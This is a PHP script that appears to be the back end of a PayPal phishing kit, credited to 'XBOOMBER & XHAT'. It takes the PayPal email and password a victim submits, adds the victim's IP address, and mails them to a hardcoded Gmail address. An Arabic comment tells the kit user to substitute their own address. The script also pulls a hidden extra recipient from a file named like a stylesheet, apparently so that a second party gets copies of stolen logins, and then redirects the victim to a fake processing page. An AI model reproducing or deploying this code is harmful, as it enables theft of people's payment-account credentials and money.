<?php

/*
 __    __  _______    ______    ______   __       __  _______   ________  _______  
/  |  /  |/       \  /      \  /      \ /  \     /  |/       \ /        |/       \ 
$$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |$$  \   /$$ |$$$$$$$  |$$$$$$$$/ $$$$$$$  |
$$  \/$$/ $$ |__$$ |$$ |  $$ |$$ |  $$ |$$$  \ /$$$ |$$ |__$$ |$$ |__    $$ |__$$ |
 $$  $$<  $$    $$< $$ |  $$ |$$ |  $$ |$$$$  /$$$$ |$$    $$< $$    |   $$    $$< 
  $$$$  \ $$$$$$$  |$$ |  $$ |$$ |  $$ |$$ $$ $$/$$ |$$$$$$$  |$$$$$/    $$$$$$$  |
 $$ /$$  |$$ |__$$ |$$ \__$$ |$$ \__$$ |$$ |$$$/ $$ |$$ |__$$ |$$ |_____ $$ |  $$ |
$$ |  $$ |$$    $$/ $$    $$/ $$    $$/ $$ | $/  $$ |$$    $$/ $$       |$$ |  $$ |
$$/   $$/ $$$$$$$/   $$$$$$/   $$$$$$/  $$/      $$/ $$$$$$$/  $$$$$$$$/ $$/   $$/ 
                                                                                   
                                                                                   
                                                                                   
                                ___       ___                                      
                               /   \     /   \                                     
                              /$$$  |   /$$$  |                                    
                              $$ $$ \__ $$ $$ \__                                  
                              /$$$     |/$$$     |                                 
                              $$ $$ $$/ $$ $$ $$/                                  
                              $$ \$$  \ $$ \$$  \                                  
                              $$   $$  |$$   $$  |                                 
                               $$$$/$$/  $$$$/$$/                                  
                                                                                   
                                                                                   
                                                                                   
                   __    __  __    __   ______   ________                          
                  /  |  /  |/  |  /  | /      \ /        |                         
                  $$ |  $$ |$$ |  $$ |/$$$$$$  |$$$$$$$$/                          
                  $$  \/$$/ $$ |__$$ |$$ |__$$ |   $$ |                            
                   $$  $$<  $$    $$ |$$    $$ |   $$ |                            
                    $$$$  \ $$$$$$$$ |$$$$$$$$ |   $$ |                            
                   $$ /$$  |$$ |  $$ |$$ |  $$ |   $$ |                            
                  $$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |                            
                  $$/   $$/ $$/   $$/ $$/   $$/    $$/                             
                                                                                   
                                                                                   
                                                                                   
https://www.facebook.com/groups/XBOOMBER.XHAT/
*/

function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;
}

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['1']) && is_email($_POST['1']) && !empty($_POST['2']))
{
$message .= "=========[LOGIN INFOS]=========<br>\n";
$message .= "PayPal Email  : ".$_POST['1']."<br>\n";
$message .= "PayPal Password  : ".$_POST['2']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[BY XBOOMBER & XHAT]=========<br>";

$email = "moh.esprit@gmail.com" ; // ضع امايلك هنا ، من الافضل ان يكون جمايل //
$file = file_get_contents('css/configuration.css');
$send = $email.','.$file;
$subject = "PP LOGIN FROM [$ip]";
$headers = "From: Info-pub <paypal@service.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";


mail($send, $subject, $message,$headers);

header("Location:websc-proccessing.php");
}
else
{
header("Location:index.php");
}

?>
